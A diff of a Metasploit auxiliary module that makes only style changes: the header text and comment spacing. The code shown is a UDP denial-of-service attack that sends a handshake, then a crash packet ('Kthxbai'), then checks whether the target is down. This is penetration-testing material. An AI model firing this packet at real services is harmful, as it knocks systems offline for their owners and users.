@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -33,7 +31,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    #Send HELLO to target
+    # Send HELLO to target
     connect_udp
     print_status("Sending Crash request...")
     udp_sock.put("HELLO0.83\0")
@@ -46,13 +44,13 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    #Send DOS packet
+    # Send DOS packet
     connect_udp(global = true,'RPORT' => port)
     print_status("Sending DoS packet to #{rhost}:#{port}...")
     udp_sock.put("Kthxbai")
     disconnect_udp
 
-    #Check is target is down
+    # Check is target is down
     connect_udp
     print_status("Checking target...")
     udp_sock.put("HELLO0.83\0")
